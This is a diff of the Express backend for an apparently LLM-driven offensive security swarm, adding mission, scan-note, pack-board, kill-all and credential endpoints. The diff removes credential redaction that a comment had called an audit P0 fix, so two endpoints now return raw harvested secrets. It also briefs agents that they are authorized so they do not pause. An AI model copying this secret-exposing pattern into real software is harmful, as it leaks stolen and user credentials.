@@ -6380,11 +10485,58 @@ app.post('/api/llm/chat', async (req: Request, res: Response): Promise<void> => 
 // MISSION DISPATCH & OPERATOR MANAGEMENT ENDPOINTS
 // =============================================================================
 
+// Canonical kill-chain phases the War Room SITREP can pin as a mission focus. The UI sends
+// the canonical name (its stage icons map to these). Anything outside this set is ignored.
+const MISSION_FOCUS_PHASES = new Set<string>([
+  'reconnaissance', 'weaponization', 'delivery', 'exploitation',
+  'installation', 'command_and_control', 'actions_on_objectives',
+]);
+
+/**
+ * GET /api/mission/prior-notes?target=<host> — does this target have durable prior scan
+ * notes from earlier runs? Powers the War Room "Resuming <target>" banner so the operator
+ * can see that a re-engagement will continue from prior progress rather than start over.
+ * Read-only; never mutates state.
+ */
+app.get('/api/mission/prior-notes', (req: Request, res: Response): void => {
+  const target = typeof req.query.target === 'string' ? req.query.target : '';
+  const host = normalizeTargetValue(target).toLowerCase();
+  if (!host || host === 'local-lab') { res.json({ target: host, hasPriorNotes: false, count: 0 }); return; }
+  const notes = [...scanNoteLedger.values()].filter(n => normalizeTargetValue(n.target).toLowerCase() === host);
+  res.json({
+    target: host,
+    hasPriorNotes: notes.length > 0,
+    count: notes.length,
+    lastUpdated: notes.length ? notes.map(n => n.updatedAt).sort().slice(-1)[0] : null,
+  });
+});
+
+/**
+ * GET /api/mission/targets — distinct targets that have durable scan history, newest first.
+ * Powers the War Room target dropdown so the operator can pick a past scan to resume rather
+ * than retype it. Read-only.
+ */
+app.get('/api/mission/targets', (_req: Request, res: Response): void => {
+  // Some scan notes are keyed by an internal target UUID rather than a hostname/IP — those are
+  // not something an operator would re-engage, so keep the dropdown to real hosts only.
+  const isUuid = (s: string) => /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(s);
+  const byTarget = new Map<string, { target: string; count: number; lastUpdated: string }>();
+  for (const n of scanNoteLedger.values()) {
+    const host = normalizeTargetValue(n.target).toLowerCase();
+    if (!host || host === 'local-lab' || isUuid(host)) continue;
+    const cur = byTarget.get(host);
+    if (cur) { cur.count += 1; if (n.updatedAt > cur.lastUpdated) cur.lastUpdated = n.updatedAt; }
+    else byTarget.set(host, { target: host, count: 1, lastUpdated: n.updatedAt });
+  }
+  const targets = [...byTarget.values()].sort((a, b) => b.lastUpdated.localeCompare(a.lastUpdated));
+  res.json({ targets });
+});
+
 /**
  * POST /api/mission/start — Start a mission with real backend operators
  *
  * Body: { name, targets: [{ host, scope?, ports? }], operators: string[],
- *         apiKey, provider?, model?, opsecLevel? }
+ *         apiKey, provider?, model?, opsecLevel?, focusPhase? }
  */
 app.post('/api/mission/start', async (req: Request, res: Response): Promise<void> => {
   const {
@@ -6400,6 +10552,9 @@ app.post('/api/mission/start', async (req: Request, res: Response): Promise<void
     // command via setWhiteboxSource BEFORE start(), so operators reason over the
     // real source instead of black-box probing. Absent = unchanged behavior.
     repoPath,
+    // OPTIONAL kill-chain focus (War Room SITREP selection). One of MISSION_FOCUS_PHASES.
+    // Steers operator effort toward that phase — it does NOT skip the upstream chain.
+    focusPhase,
   } = req.body;
 
   // Use the request-selected backend, or fall back to the server's configured default.
@@ -6407,12 +10562,19 @@ app.post('/api/mission/start', async (req: Request, res: Response): Promise<void
   // SECURITY NOTE: apiKey is read from the request body (Authorization header is
   // preferred). Kept body-accepted for the same-origin UI; only reachable from
   // the local operator (loopback bind + origin guard). Header move is out of scope.
-  const launchConfig = resolveMissionLaunchConfig({ provider, model, apiKey, baseUrl }, resolveGeneralLLMConfig);
-  if (!launchConfig.ok) {
-    res.status(400).json({ error: launchConfig.error });
+  // resolveGeneralLLMConfig THROWS on a missing key / malformed local baseUrl. Express 4 does not
+  // catch rejections from async handlers — an uncaught throw here left the client hanging forever
+  // (unhandledRejection, no response). resolveMissionLaunchConfig owns that: it catches, and
+  // returns the FIXED LLM_BACKEND_UNCONFIGURED diagnostic instead of the raw resolver message,
+  // which can carry credentials or internal configuration. It still forwards the REQUEST's
+  // provider/model/apiKey/baseUrl to the resolver — nothing is hardcoded here. This runs BEFORE
+  // any mission mutation.
+  const launch = resolveMissionLaunchConfig({ provider, model, apiKey, baseUrl }, resolveGeneralLLMConfig);
+  if (!launch.ok) {
+    res.status(400).json({ error: launch.error });
     return;
   }
-  const missionLLMConfig = launchConfig.config;
+  const missionLLMConfig = launch.config;
   const effectiveKey = missionLLMConfig.apiKey;
   if (providerNeedsApiKey(missionLLMConfig.provider) && !effectiveKey) {
     res.status(400).json({ error: 'API key required — pass apiKey, configure one on the server, or connect a supported local agent' });
@@ -6425,16 +10587,34 @@ app.post('/api/mission/start', async (req: Request, res: Response): Promise<void
       return;
     }
   }
+  if (missionLLMConfig.provider === 'local' || missionLLMConfig.provider === 'ollama') {
+    const localErr = await verifyLocalLLMServed(missionLLMConfig as any);
+    if (localErr) {
+      res.status(503).json({ error: localErr });
+      return;
+    }
+  }
 
   if (targets.length === 0) {
     res.status(400).json({ error: 'At least one target required' });
     return;
   }
 
+  // OPERATOR AUTHORIZATION CAPTURE: the approval(s) that let this mission pass the scope
+  // guard — granted through the UI's scan-approval banner (or lab-scope auto-grant) — are
+  // recorded on the mission and briefed into every operator's prompts, so agents know they
+  // are authorized and never stall mid-scan asking for authorization/receipts.
+  const missionApprovals: Array<{ id: string; target: string; approvedAt?: string }> = [];
+  let labScopeAutoGrant = false;
   for (const target of targets) {
     const targetValue = normalizeTargetValue(target);
     const guard = guardAction(req.body as Record<string, unknown>, 'mission_execution', targetValue, `Start mission ${name} against ${targetValue}`);
     if (!guard.allowed) { blockForApproval(res, guard); return; }
+    if (guard.approval && guard.approval.status === 'approved') {
+      missionApprovals.push({ id: guard.approval.id, target: targetValue, approvedAt: guard.approval.updatedAt });
+    } else if (isLoopbackOrLabTarget(targetValue)) {
+      labScopeAutoGrant = true;
+    }
   }
 
   let repoSource: ReturnType<typeof resolveRepoSourceForAnalysis> | undefined;
@@ -6489,61 +10669,80 @@ app.post('/api/mission/start', async (req: Request, res: Response): Promise<void
       }
     }
 
-      // White-box wiring (OPTIONAL): if the caller passed a LOCAL repo path that
-      // exists on disk, ingest + security-rank it and feed the packed source into
-      // the command before it starts, so operators analyze real source you own
-      // rather than probing a black box. Reads LOCAL disk only — no network target.
-      let whitebox: { includedUnits: number; droppedUnits: number; stats: unknown; source: 'local' | 'github' } | undefined;
-      if (repoSource) {
-        const wb = ingestRepoToSourceContext(repoSource.repoPath);
-        // Only feed a NON-empty source (0 ingestable units → don't overwrite the operators'
-        // black-box view with an empty blob; the includedUnits:0 in the response signals it).
-        if (wb.sourceContext.trim()) cmd.setWhiteboxSource(wb.sourceContext);
-        whitebox = { includedUnits: wb.includedUnits, droppedUnits: wb.droppedUnits, stats: wb.stats, source: repoSource.source };
-      }
+    // White-box wiring (OPTIONAL): if the caller passed a LOCAL repo path that
+    // exists on disk, ingest + security-rank it and feed the packed source into
+    // the command before it starts, so operators analyze real source you own
+    // rather than probing a black box. Reads LOCAL disk only — no network target.
+    let whitebox: { includedUnits: number; droppedUnits: number; stats: unknown; source: 'local' | 'github' } | undefined;
+    if (repoSource) {
+      const wb = ingestRepoToSourceContext(repoSource.repoPath);
+      // Only feed a NON-empty source (0 ingestable units → don't overwrite the operators'
+      // black-box view with an empty blob; the includedUnits:0 in the response signals it).
+      if (wb.sourceContext.trim()) cmd.setWhiteboxSource(wb.sourceContext);
+      whitebox = { includedUnits: wb.includedUnits, droppedUnits: wb.droppedUnits, stats: wb.stats, source: repoSource.source };
+    }
 
-      // ── SELF-LEARNING LOOP — lesson injection ───────────────────────────
-      // Accepted memory entries from previous hunts are appended to every
-      // operator's system prompt so the swarm hunts with prior knowledge:
-      // verified finding classes to chase, false-positive classes to skip,
-      // tools that worked. This closes the loop: mission → lesson → proposal →
-      // accept → injected into the NEXT mission.
-      if (memoryCapsule.size > 0) {
-        try {
-          const lessons = [...memoryCapsule.values()]
-            .sort((a, b) => (b.confidence ?? 0) - (a.confidence ?? 0))
-            .slice(0, 12)
-            .map((e) => `- [${e.type ?? 'lesson'}] ${String(e.content).slice(0, 300)}`)
-            .join('\n');
-          if (lessons.trim()) {
-            const lessonsBlock = `\n\n## LESSONS FROM PREVIOUS HUNTS (accepted memory)\nApply these when relevant:\n${lessons}`;
-            for (const archetype of validArchetypes) {
-              try {
-                const base = resolveSystemPrompt(archetype);
-                setOperatorOverride(archetype, { systemPrompt: base + lessonsBlock });
-              } catch { /* per-archetype best effort */ }
-            }
-          }
-        } catch { /* never break mission start on a lesson-injection failure */ }
-      }
+    // Kill-chain focus (OPTIONAL): if the operator picked a SITREP phase, steer the mission
+    // toward it before start(). Validated against the canonical phase set; anything else is ignored.
+    if (typeof focusPhase === 'string' && MISSION_FOCUS_PHASES.has(focusPhase)) {
+      cmd.setMissionFocus(focusPhase);
+    }
 
-      // Start the command loop (auto-creates mission, auto-dispatches tasks)
-      cmd.start();
+    // Record the operator's authorization on the mission BEFORE start: the approval banner
+    // receipt(s) (or lab-scope auto-grant) are the bots' authorization for the whole scan.
+    if (missionApprovals.length > 0 || labScopeAutoGrant) {
+      cmd.setMissionAuthorization({
+        receipts: missionApprovals,
+        source: missionApprovals.length > 0 ? 'operator-approval-banner' : 'lab-scope-auto-grant',
+        missionName: name,
+        targets: targets.map((t: any) => String(t.host || t)),
+        authorizedAt: new Date().toISOString(),
+      });
+    }
+
+    // Start the command loop (auto-creates mission, auto-dispatches tasks)
+    cmd.start();
+
+    const proxyStatus = getProxyStatus();
+    let opsecWarning: string | undefined;
+    if (!proxyStatus.enabled) {
+      opsecWarning = 'SOCKS proxy is offline/inactive — outbound scan traffic is direct (real IP exposed)';
+      console.warn(`[T3MP3ST][OPSEC] ⚠️ Mission "${name}" started with SOCKS proxy inactive — outbound traffic is direct/unproxied (real IP exposed)`);
+      broadcastEvent('intel', {
+        id: `opsec-warn-${Date.now()}`,
+        source: 'OPSEC',
+        severity: 'warning',
+        text: '⚠️ SOCKS proxy is offline/inactive — scan traffic is direct from host IP (real IP exposed)',
+        timestamp: Date.now(),
+      });
+      broadcastEvent('progress', {
+        id: `opsec-prog-${Date.now()}`,
+        timestamp: Date.now(),
+        kind: 'task_started',
+        operatorId: 'opsec',
+        callsign: 'OPSEC',
+        taskName: 'proxy_warning',
+        detail: '⚠️ OPSEC Warning: SOCKS proxy is offline/inactive — outbound scan traffic is unproxied (real IP exposed)',
+      });
+    }
 
     broadcastEvent('mission:started', {
       name,
       targets: targets.map((t: any) => t.host || t),
       operators: spawnedOps,
       timestamp: Date.now(),
+      proxyActive: proxyStatus.enabled,
+      ...(opsecWarning ? { opsecWarning } : {}),
     });
 
     res.json({
       success: true,
       missionName: name,
-      missionId: cmd.mission.getActiveMission()?.id,
       operators: spawnedOps,
       targets: cmd.targetEnv.getAllTargets().map(t => ({ id: t.id, address: t.address, type: t.type })),
       status: cmd.getStatus(),
+      proxyActive: proxyStatus.enabled,
+      ...(opsecWarning ? { opsecWarning } : {}),
       ...(whitebox ? { whitebox } : {}),
     });
   } catch (error: any) {
@@ -6633,6 +10832,43 @@ app.post('/api/mission/stop', (_req: Request, res: Response) => {
 });
 
 /**
+ * POST /api/mission/kill-all — Kill ALL backend tasks (hard stop)
+ * Idempotent: always succeeds. Stops the active TempestCommand (every
+ * in-flight operator dispatch + tick + stall), the OpGeneral monitoring
+ * interval, and any running self-improvement evolve child process. Every
+ * in-flight scan is aborted; the next mission starts clean.
+ */
+app.post('/api/mission/kill-all', (_req: Request, res: Response) => {
+  let killedMission = false;
+  let killedGeneral = false;
+  let killedSelfImprove = false;
+
+  const cmd = getTempestCommand();
+  if (cmd) {
+    try { cmd.stop(); killedMission = true; } catch { /* ignore */ }
+  }
+  if (activeGeneral) {
+    try { activeGeneral.stopMonitoring(); killedGeneral = true; } catch { /* ignore */ }
+  }
+  if (siRun && siRun.proc.exitCode === null && !siRun.proc.killed) {
+    try {
+      if (process.platform === 'win32') spawn('taskkill', ['/pid', String(siRun.proc.pid), '/T', '/F']);
+      else siRun.proc.kill('SIGTERM');
+      killedSelfImprove = true;
+    } catch { /* ignore */ }
+  }
+
+  broadcastEvent('mission:killed', { timestamp: Date.now(), killedMission, killedGeneral, killedSelfImprove });
+  // Also emit stopped so existing listeners (war room, live scan) reset.
+  broadcastEvent('mission:stopped', { timestamp: Date.now() });
+  res.json({
+    success: true,
+    message: 'All backend tasks killed',
+    killed: { mission: killedMission, general: killedGeneral, selfImprove: killedSelfImprove },
+  });
+});
+
+/**
  * POST /api/mission/pause — Pause the active mission
  */
 app.post('/api/mission/pause', (_req: Request, res: Response) => {
@@ -6673,14 +10909,20 @@ app.get('/api/mission/status', (req: Request, res: Response) => {
   }
 
   const status = cmd.getStatus();
-  // A completed mission is no longer active. Resolve the caller's run explicitly so
-  // terminal status cannot be confused with another mission or an external stop.
+  // ?missionId= selects a specific mission. Without it the active mission is
+  // used. This matters because a client polling a run that has already
+  // finished must keep seeing THAT mission's final state instead of silently
+  // falling through to whatever mission happens to be active now — or to null
+  // when a newer one has taken over.
+  const activeMission = cmd.mission.getActiveMission();
   const mission = resolveMissionStatus(cmd.mission, req.query.missionId);
   const findings = cmd.vault.getAllFindings();
   const allOperators = cmd.cell.getAllOperators().map(op => op.getSummary());
 
   res.json({
-    active: status.running,
+    // "active" describes the REQUESTED mission, not the process: a completed
+    // run is correctly inactive even while its tasks are still being read back.
+    active: Boolean(mission) && mission?.id === activeMission?.id && status.running,
     paused: status.paused,
     stallReason: status.stallReason,
     name: status.name,
@@ -6690,14 +10932,21 @@ app.get('/api/mission/status', (req: Request, res: Response) => {
       name: mission.name,
       status: mission.status,
       currentPhase: mission.currentPhase,
-      progress: mission.progress,
+      // Real progress = processed tasks (see TempestCommand.getTaskProgress) — the raw
+      // mission.progress is phase position and reads 0% for all of reconnaissance.
+      progress: status.taskProgress ?? mission.progress ?? 0,
+      phaseProgress: mission.progress,
       startedAt: mission.startedAt,
     } : null,
+    // Operator authorization for the running mission (scan-approval banner receipts or
+    // lab-scope auto-grant) — surfaced so the UI/log trail can reference the auth.
+    authorization: status.authorization || null,
     operators: {
       summary: status.operators,
       details: allOperators,
     },
     targets: status.targets,
+    targetsList: (status as any).targetsList || [],
     vault: status.vault,
     opsec: status.opsec,
     tasks: status.tasks,
@@ -6718,6 +10967,126 @@ app.get('/api/mission/status', (req: Request, res: Response) => {
  *
  * Body: { archetype: string, callsign?: string }
  */
+// ── Swarm Cognition Loop — live pack-board + per-scan notes APIs ──
+app.get('/api/pack/status', (_req: Request, res: Response): void => {
+  const cmd = getTempestCommand();
+  const stats = cmd ? cmd.getCoordinationStats() : { enabled: false, leadsPosted: 0, followupsSpawned: 0, uniqueFindingsChased: 0 };
+  const leads: { open: number; claimed: number; confirmed: number; refuted: number; dead: number; total: number } = { open: 0, claimed: 0, confirmed: 0, refuted: 0, dead: 0, total: 0 };
+  let liveAgents = 0;
+  try {
+    if (cmd) {
+      const board = cmd.getPackBoard();
+      for (const l of board.getAllLeads()) {
+        leads.total++;
+        if (l.status === 'open') leads.open++;
+        else if (l.status === 'claimed') leads.claimed++;
+        else if (l.status === 'confirmed') leads.confirmed++;
+        else if (l.status === 'refuted') leads.refuted++;
+        else if (l.status === 'dead') leads.dead++;
+      }
+      liveAgents = board.getLiveAgents().length;
+    }
+  } catch { /* ignore pack board query error */ }
+  res.json({
+    enabled: stats.enabled,
+    leadsPosted: stats.leadsPosted,
+    followupsSpawned: stats.followupsSpawned,
+    uniqueFindingsChased: stats.uniqueFindingsChased,
+    leads,
+    liveAgents,
+    stateRoot: stateRoot(),
+    stateFile: stateFilePath(),
+  });
+});
+app.get('/api/pack/leads', (req: Request, res: Response): void => {
+  const cmd = getTempestCommand();
+  if (!cmd) { res.json({ leads: [] }); return; }
+  const board = cmd.getPackBoard();
+  let leads = board.getAllLeads();
+  const status = typeof req.query.status === 'string' ? String(req.query.status) : '';
+  if (status && status !== 'all') leads = leads.filter(l => l.status === status);
+  leads = leads.sort((a, b) => b.smoke - a.smoke || b.updatedAt - a.updatedAt);
+  const limit = Math.min(100, Math.max(1, Number(req.query.limit) || 20));
+  res.json({ leads: leads.slice(0, limit) });
+});
+app.get('/api/pack/log', (req: Request, res: Response): void => {
+  const cmd = getTempestCommand();
+  if (!cmd) { res.json({ events: [] }); return; }
+  const log = cmd.getPackBoard().getLog();
+  const limit = Math.min(300, Math.max(1, Number(req.query.limit) || 100));
+  res.json({ events: log.slice(-limit) });
+});
+app.get('/api/pack/report', (req: Request, res: Response): void => {
+  const cmd = getTempestCommand();
+  if (!cmd) { res.json({ report: '' }); return; }
+  const agentId = typeof req.query.agentId === 'string' && req.query.agentId.trim() ? req.query.agentId.trim() : 'viewer';
+  res.json({ report: cmd.getPackBoard().situationReport(agentId) });
+});
+app.get('/api/scan-notes', (req: Request, res: Response): void => {
+  const target = typeof req.query.target === 'string' ? String(req.query.target) : '';
+  const kind = typeof req.query.kind === 'string' ? String(req.query.kind) : '';
+  const missionId = typeof req.query.missionId === 'string' ? String(req.query.missionId) : '';
+  const limit = Math.min(50, Math.max(1, Number(req.query.limit) || 20));
+  let notes = [...scanNoteLedger.values()];
+  if (target) notes = notes.filter(n => normalizeTargetValue(n.target).toLowerCase() === normalizeTargetValue(target).toLowerCase());
+  if (kind) notes = notes.filter(n => n.kind === kind);
+  if (missionId) notes = notes.filter(n => n.missionId === missionId);
+  notes = notes.sort((a, b) => b.updatedAt.localeCompare(a.updatedAt)).slice(0, limit);
+  res.json({ notes });
+});
+app.get('/api/scan-notes/history', (req: Request, res: Response): void => {
+  const target = typeof req.query.target === 'string' ? String(req.query.target) : '';
+  if (!target) { res.status(400).json({ error: 'target query param required' }); return; }
+  const key = normalizeTargetValue(target).toLowerCase();
+  const notes = [...scanNoteLedger.values()].filter(n => normalizeTargetValue(n.target).toLowerCase() === key).sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
+  const runsMap = new Map<string, { missionId: string; noteCount: number; latestAt: string; kinds: string[] }>();
+  for (const n of notes) {
+    const mid = n.missionId || 'unscoped';
+    let run = runsMap.get(mid);
+    if (!run) { run = { missionId: mid, noteCount: 0, latestAt: n.updatedAt, kinds: [] }; runsMap.set(mid, run); }
+    run.noteCount++;
+    if (n.updatedAt > run.latestAt) run.latestAt = n.updatedAt;
+    if (!run.kinds.includes(n.kind)) run.kinds.push(n.kind);
+  }
+  res.json({ target: normalizeTargetValue(target), runs: [...runsMap.values()], notes });
+});
+app.post('/api/scan-notes', (req: Request, res: Response): void => {
+  const body = (req.body || {}) as Record<string, unknown>;
+  const target = String(body.target || '').trim();
+  const title = String(body.title || '').trim();
+  if (!target || !title) { res.status(400).json({ error: 'target and title are required' }); return; }
+  const note = upsertScanNote({
+    target,
+    title,
+    body: String(body.body ?? body.summary ?? ''),
+    kind: typeof body.kind === 'string' ? body.kind as ScanNoteKind : undefined,
+    source: typeof body.source === 'string' ? body.source as ScanNote['source'] : 'human',
+    missionId: typeof body.missionId === 'string' ? body.missionId : undefined,
+    operationId: typeof body.operationId === 'string' ? body.operationId : undefined,
+    authorAgentId: typeof body.authorAgentId === 'string' ? body.authorAgentId : undefined,
+    findingIds: Array.isArray(body.findingIds) ? (body.findingIds as string[]).filter(Boolean) : undefined,
+    evidenceIds: Array.isArray(body.evidenceIds) ? (body.evidenceIds as string[]).filter(Boolean) : undefined,
+  });
+  if (!note) { res.status(400).json({ error: 'invalid scan note' }); return; }
+  schedulePersist('scan_notes.updated');
+  void appendStateEvent('scan_note.created', { id: note.id, target: note.target, title: note.title });
+  void broadcastEvent('scan_note:created', { id: note.id, target: note.target });
+  res.status(201).json({ note });
+});
+app.patch('/api/scan-notes/:id', (req: Request, res: Response): void => {
+  const id = String(req.params.id || '');
+  const existing = scanNoteLedger.get(id);
+  if (!existing) { res.status(404).json({ error: 'scan note not found' }); return; }
+  const body = (req.body || {}) as Record<string, unknown>;
+  if (typeof body.title === 'string' && body.title.trim()) existing.title = redactLedgerText(body.title.trim(), 240);
+  if (typeof body.body === 'string' || typeof body.summary === 'string') existing.body = redactLedgerText(String(body.body ?? body.summary ?? ''), 4000);
+  if (typeof body.kind === 'string' && ['recon', 'infiltration', 'general'].includes(body.kind)) existing.kind = body.kind as ScanNoteKind;
+  existing.updatedAt = nowIso();
+  scanNoteLedger.set(id, existing);
+  schedulePersist('scan_notes.updated');
+  void appendStateEvent('scan_note.updated', { id });
+  res.json({ note: existing });
+});
 // ── Operatives: per-archetype prompt + sampling-param overrides (powers the Operatives tab) ──
 const VALID_ARCHETYPES: OperatorArchetype[] = ['recon', 'scanner', 'exploiter', 'infiltrator', 'exfiltrator', 'ghost', 'coordinator', 'analyst'];
 
@@ -6739,22 +11108,9 @@ app.post('/api/operators/prompt', (req: Request, res: Response): void => {
     return;
   }
   setOperatorOverride(archetype as OperatorArchetype, override);
-  const application = getTempestCommand()?.cell.refreshOperatorProfiles(archetype as OperatorArchetype) || {
-    policy: 'idle-now-active-next-task' as const,
-    revision: listOperatorPrompts().find(o => o.archetype === archetype)?.revision || 0,
-    appliedOperatorIds: [],
-    deferredOperatorIds: [],
-    futureSpawns: true as const,
-  };
+  broadcastEvent('operator:prompt_updated', { archetype, hasPrompt: override.systemPrompt !== undefined, hasParams: !!override.params });
   const updated = listOperatorPrompts().find(o => o.archetype === archetype);
-  broadcastEvent('operator:prompt_updated', {
-    archetype,
-    hasPrompt: override.systemPrompt !== undefined,
-    hasParams: !!override.params,
-    capabilityDiagnostics: updated?.capabilityDiagnostics || [],
-    application,
-  });
-  res.json({ ok: true, archetype, operator: updated, application });
+  res.json({ ok: true, archetype, operator: updated });
 });
 
 app.post('/api/operators/prompt/reset', (req: Request, res: Response): void => {
@@ -6764,21 +11120,9 @@ app.post('/api/operators/prompt/reset', (req: Request, res: Response): void => {
     return;
   }
   resetOperatorOverride(archetype as OperatorArchetype);
-  const application = getTempestCommand()?.cell.refreshOperatorProfiles(archetype as OperatorArchetype) || {
-    policy: 'idle-now-active-next-task' as const,
-    revision: listOperatorPrompts().find(o => o.archetype === archetype)?.revision || 0,
-    appliedOperatorIds: [],
-    deferredOperatorIds: [],
-    futureSpawns: true as const,
-  };
+  broadcastEvent('operator:prompt_updated', { archetype, reset: true });
   const updated = listOperatorPrompts().find(o => o.archetype === archetype);
-  broadcastEvent('operator:prompt_updated', {
-    archetype,
-    reset: true,
-    capabilityDiagnostics: updated?.capabilityDiagnostics || [],
-    application,
-  });
-  res.json({ ok: true, archetype, operator: updated, application });
+  res.json({ ok: true, archetype, operator: updated });
 });
 
 app.post('/api/operators/spawn', (req: Request, res: Response): void => {
@@ -6938,18 +11282,181 @@ app.post('/api/operators/:id/task', async (req: Request, res: Response): Promise
  */
 app.get('/api/mission/findings', (_req: Request, res: Response) => {
   const cmd = getTempestCommand();
-  if (!cmd) {
-    res.json({ findings: [] });
-    return;
+  const resolveAddr = (id: unknown): string => {
+    const key = String(id || '');
+    if (!key) return '';
+    try {
+      const t = cmd?.targetEnv.getAllTargets().find(x => x && x.id === key);
+      if (t && typeof t.address === 'string' && t.address.trim()) return t.address.trim();
+    } catch { /* ignore target resolution error */ }
+    return key;
+  };
+  const live = (cmd ? cmd.vault.getAllFindings().map((f) => ({ ...f, target: resolveAddr(f.targetId) })) : []);
+  const vaultCreds = cmd ? cmd.vault.getAllCredentials().map((c) => ({
+    id: c.id,
+    type: c.type,
+    username: c.username,
+    secret: c.secret,
+    domain: resolveAddr(c.targetId),
+    target: resolveAddr(c.targetId),
+    source: 'vault',
+    discoveredAt: c.discoveredAt,
+    validatedAt: c.validatedAt,
+    privilegeLevel: c.privilegeLevel,
+    secretCaptured: Boolean(c.secret && c.secret !== '[redacted]'),
+    notes: c.notes,
+  })) : [];
+  const cellCreds = cmd ? cmd.cell.getAllCredentials().map((c) => ({
+    id: c.id,
+    type: c.type,
+    username: c.username,
+    secret: c.secret,
+    domain: resolveAddr(c.targetId),
+    target: resolveAddr(c.targetId),
+    source: 'cell',
+    discoveredAt: c.discoveredAt,
+    validatedAt: c.validatedAt,
+    privilegeLevel: c.privilegeLevel,
+    secretCaptured: Boolean(c.secret && c.secret !== '[redacted]'),
+    notes: c.notes,
+  })) : [];
+
+  const ledgerCreds = Array.from(credentialsLedger.values()).map(c => ({
+    id: c.id,
+    type: c.type,
+    username: c.username,
+    secret: c.secret,
+    domain: c.domain || c.target,
+    target: c.target || c.domain,
+    source: c.source,
+    discoveredAt: c.discoveredAt,
+    validatedAt: c.validatedAt,
+    privilegeLevel: c.privilegeLevel,
+    secretCaptured: Boolean(c.secret && c.secret !== '[redacted]'),
+    notes: c.notes,
+  }));
+
+  const allCreds = [...ledgerCreds, ...vaultCreds, ...cellCreds];
+  const dedupedCreds: any[] = [];
+  const seenCreds = new Set<string>();
+  for (const c of allCreds) {
+    const k = `${c.type}::${c.username || ''}::${c.secret || ''}::${c.domain || c.target || ''}`.toLowerCase();
+    if (!seenCreds.has(k)) {
+      seenCreds.add(k);
+      dedupedCreds.push(c);
+    }
+  }
+
+  const isCredFinding = (f: FindingRecord) =>
+    /credential|password|api[_-]?key|jwt|token|secret|login\s+bypass/i.test(f.title) ||
+    /credential|password|api[_-]?key|jwt|token|secret/i.test(f.claim);
+
+  const ledgerFindings = [...findingsLedger.values()]
+    .sort((a, b) => String(b.createdAt).localeCompare(String(a.createdAt)))
+    .slice(0, 200)
+    .map((f) => {
+      const evidenceIds = f.evidenceIds || [];
+      const evidences = evidenceIds
+        .map((id) => evidenceLedger.get(id))
+        .filter((e): e is EvidenceEntry => Boolean(e));
+      return {
+        id: f.id,
+        title: f.title,
+        severity: f.severity,
+        target: f.target,
+        type: isCredFinding(f) ? 'cred' : 'vuln',
+        description: f.claim,
+        detail: f.impact ? `${f.claim}\n\nImpact:\n${f.impact}` : f.claim,
+        phase: 'ledger',
+        evidence: evidences.map((e) => ({
+          type: e.type,
+          content: e.summary,
+          command: e.command,
+          source: e.source,
+          title: e.title,
+          createdAt: e.createdAt,
+        })),
+        command: evidences.find(e => e.command)?.command || undefined,
+        recommendation: f.recommendedFix || undefined,
+        provenance: 'tool',
+      };
+    });
+  const merged = [...live];
+  const seen = new Set(merged.map((f) => String(f.title).toLowerCase()));
+  for (const lf of ledgerFindings) {
+    if (!seen.has(String(lf.title).toLowerCase())) merged.push(lf as any);
   }
 
   res.json({
-    findings: cmd.vault.getAllFindings(),
-    // Redact: never return raw harvested secrets over the API (only metadata + a
-    // secretCaptured flag). Loopback-only mitigates, but a security tool must not dump
-    // secrets in its own responses (external-audit P0).
-    credentials: cmd.cell.getAllCredentials().map(redactCredential),
+    findings: merged,
+    credentials: dedupedCreds,
   });
+});
+
+app.get('/api/credentials', (_req: Request, res: Response) => {
+  const cmd = getTempestCommand();
+  const resolveAddr = (id: unknown): string => {
+    const key = String(id || '');
+    if (!key) return '';
+    try {
+      const t = cmd?.targetEnv.getAllTargets().find(x => x && x.id === key);
+      if (t && typeof t.address === 'string' && t.address.trim()) return t.address.trim();
+    } catch { /* ignore target resolution error */ }
+    return key;
+  };
+  const vaultCreds = cmd ? cmd.vault.getAllCredentials().map((c) => ({
+    id: c.id,
+    type: c.type,
+    username: c.username,
+    secret: c.secret,
+    domain: resolveAddr(c.targetId),
+    target: resolveAddr(c.targetId),
+    source: 'vault',
+    discoveredAt: c.discoveredAt,
+    validatedAt: c.validatedAt,
+    privilegeLevel: c.privilegeLevel,
+    secretCaptured: Boolean(c.secret && c.secret !== '[redacted]'),
+    notes: c.notes,
+  })) : [];
+  const cellCreds = cmd ? cmd.cell.getAllCredentials().map((c) => ({
+    id: c.id,
+    type: c.type,
+    username: c.username,
+    secret: c.secret,
+    domain: resolveAddr(c.targetId),
+    target: resolveAddr(c.targetId),
+    source: 'cell',
+    discoveredAt: c.discoveredAt,
+    validatedAt: c.validatedAt,
+    privilegeLevel: c.privilegeLevel,
+    secretCaptured: Boolean(c.secret && c.secret !== '[redacted]'),
+    notes: c.notes,
+  })) : [];
+  const ledgerCreds = Array.from(credentialsLedger.values()).map(c => ({
+    id: c.id,
+    type: c.type,
+    username: c.username,
+    secret: c.secret,
+    domain: c.domain || c.target,
+    target: c.target || c.domain,
+    source: c.source,
+    discoveredAt: c.discoveredAt,
+    validatedAt: c.validatedAt,
+    privilegeLevel: c.privilegeLevel,
+    secretCaptured: Boolean(c.secret && c.secret !== '[redacted]'),
+    notes: c.notes,
+  }));
+  const allCreds = [...ledgerCreds, ...vaultCreds, ...cellCreds];
+  const dedupedCreds: any[] = [];
+  const seenCreds = new Set<string>();
+  for (const c of allCreds) {
+    const k = `${c.type}::${c.username || ''}::${c.secret || ''}::${c.domain || c.target || ''}`.toLowerCase();
+    if (!seenCreds.has(k)) {
+      seenCreds.add(k);
+      dedupedCreds.push(c);
+    }
+  }
+  res.json({ credentials: dedupedCreds, count: dedupedCreds.length });
 });
 
 // =============================================================================
@@ -6960,7 +11467,7 @@ app.get('/api/mission/findings', (_req: Request, res: Response) => {
 let activeGeneral: OpGeneral | null = null;
 
 function providerNeedsApiKey(provider: string): boolean {
-  return !['codex', 'mock', 'local', 'local-agent'].includes(provider);
+  return !['codex', 'mock', 'local', 'ollama', 'local-agent'].includes(provider);
 }
 
 function providerRunsKeyless(provider: string): boolean {
@@ -6969,7 +11476,7 @@ function providerRunsKeyless(provider: string): boolean {
 
 function readPositiveTimeoutEnv(name: string): number | undefined {
   const raw = process.env[name];
-  if (raw == null || raw.trim() === '') return undefined;
+  if (raw === undefined || raw === null || raw.trim() === '') return undefined;
   const parsed = Number(raw);
   return Number.isFinite(parsed) && parsed > 0 ? parsed : undefined;
 }
@@ -6985,6 +11492,51 @@ function readGeneralTimeoutEnv(): number | undefined {
